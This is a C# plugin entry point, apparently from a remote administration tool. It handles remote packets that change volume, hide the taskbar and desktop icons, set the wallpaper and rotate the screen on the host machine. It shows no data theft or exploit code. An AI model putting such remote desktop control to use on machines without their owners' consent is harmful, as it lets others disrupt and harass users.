using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType) 
            {
                case PacketType.MISC_AUDIO_UP:
                    Audio.IncreaseVolume();
                    break;

                case PacketType.MISC_AUDIO_DOWN:
                    Audio.DecreaseVolume();
                    break;

                case PacketType.MISC_HIDE_TASKBAR:
                    UI.HideTaskBar();
                    break;

                case PacketType.MISC_SHOW_TASKBAR:
                    UI.ShowTaskBar();
                    break;

                case PacketType.MISC_SET_WALLPAPER:
                    WallPaperPacket wallPaperPacket = (WallPaperPacket)loadingAPI.currentPacket;
                    UI.SetWallpaper(Compressor.QuickLZ.Decompress(wallPaperPacket.wallpaper), wallPaperPacket.ext);
                    break;

                case PacketType.MISC_HIDE_DESKTOP_ICONS:
                    UI.HideDesktopIcons();
                    break;

                case PacketType.MISC_SHOW_DESKTOP_ICONS:
                    UI.ShowDesktopIcons();
                    break;

                case PacketType.MISC_SCREEN_ROTATION:
                    ScreenRotationPacket screenRotationPacket = (ScreenRotationPacket)loadingAPI.currentPacket;
                    ScreenRotation.Rotate(screenRotationPacket.degrees);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
